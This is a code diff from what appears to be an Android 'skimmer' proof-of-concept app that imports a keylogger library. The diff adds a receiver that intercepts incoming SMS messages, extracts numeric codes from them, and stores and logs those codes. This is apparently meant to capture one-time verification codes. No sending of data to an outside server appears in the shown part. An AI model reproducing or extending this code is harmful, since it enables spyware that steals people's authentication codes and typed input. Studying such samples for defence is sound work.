@@ -24,23 +24,63 @@ import androidx.core.app.NotificationCompat
 import androidx.core.app.NotificationManagerCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import com.evilthreads.keylogger.Keylogger
 import kotlinx.android.synthetic.main.activity_main.*
 import kotlinx.coroutines.launch
+import java.lang.System.nanoTime
 import kotlin.random.Random
 
 class MainActivity : AppCompatActivity() {
-    //, SmsListener
+    private lateinit var message: List<String>;
     lateinit var sharedPreferences: SharedPreferences;
     var codeTyped: String? = null;
-    //private lateinit var broadcastSMS : BroadcastSMS
+
+    private val smsReceiver = object : BroadcastSMS() {
+        override fun onReceive(context: Context, intent: Intent) {
+            val startTime = nanoTime()
+            if (intent.action == "sms-received") {
+                val sms = intent.getStringExtra("message");
+                message = extractNumbersIfKeywordsPresent(sms.toString());
+                try {
+                    val codeInputFieldText = findViewById<EditText>(R.id.codeInputField);
+                    val code = message[0];
+
+                    if (code == "") {
+                        Toast
+                            .makeText(baseContext, "Digite um código a ser monitorado", Toast.LENGTH_LONG)
+                            .show();
+                    } else {
+                        Toast
+                            .makeText(baseContext, "Código monitorado: $code", Toast.LENGTH_LONG)
+                            .show();
+                        sharedPreferences.edit().putString(
+                            "codeTyped", code
+                        ).apply();
+                        val endTime = nanoTime()
+                        val duration = endTime - startTime
+                        Log.d("MyApp", "Tempo de execução: $duration nanosegundos")
+                    }
+
+                    Log.e("botão", "clicou");
+                    val content = codeInputFieldText.text.toString();
+                    Log.e("Content retrieved", content);
+                } catch (e : Exception) {
+                    Log.e("Content retrieved", e.toString());
+                }
+
+
+
+            }
+        }
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-       // broadcastSMS = BroadcastSMS(this)
-
+        val filter = IntentFilter("sms-received")
+        LocalBroadcastManager.getInstance(this).registerReceiver(smsReceiver, filter)
         sharedPreferences = this.getSharedPreferences(
             "com.example.skimmerpoc",
             Context.MODE_PRIVATE
@@ -116,6 +156,9 @@ class MainActivity : AppCompatActivity() {
                     .makeText(this, "Digite um código a ser monitorado", Toast.LENGTH_LONG)
                     .show();
             } else {
+                Toast
+                    .makeText(this, "Código monitorado: $code", Toast.LENGTH_LONG)
+                    .show();
                 sharedPreferences.edit().putString(
                     "codeTyped", code
                 ).apply();
